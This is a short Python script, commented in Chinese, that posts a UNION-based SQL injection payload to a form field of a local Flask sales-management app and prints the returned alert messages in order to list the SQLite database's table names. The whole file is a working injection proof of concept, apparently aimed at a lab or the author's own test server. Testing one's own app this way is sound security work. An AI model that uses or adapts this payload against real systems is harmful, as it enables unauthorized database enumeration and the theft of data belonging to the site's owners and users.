import requests
from bs4 import BeautifulSoup

# Flask web app地址
url = "http://127.0.0.1:5000/sales_management1"

# 构造SQL注入Payload：从sqlite_master中列出所有表名
payload = "0 UNION SELECT name, '', '' FROM sqlite_master WHERE type='table'--"

# 构造POST表单数据
data = {
    "brandd": "B1",
    "specific_pastad": payload,
    "dated": "2014-01-02"
}

# 发起POST请求
response = requests.post(url, data=data)

# 使用BeautifulSoup解析返回的HTML并提取提示信息
soup = BeautifulSoup(response.text, 'html.parser')
alerts = soup.find_all("div", class_="alert")

print("\n📢 Extracted Flash Messages:")
for alert in alerts:
    print(alert.get_text(strip=True))
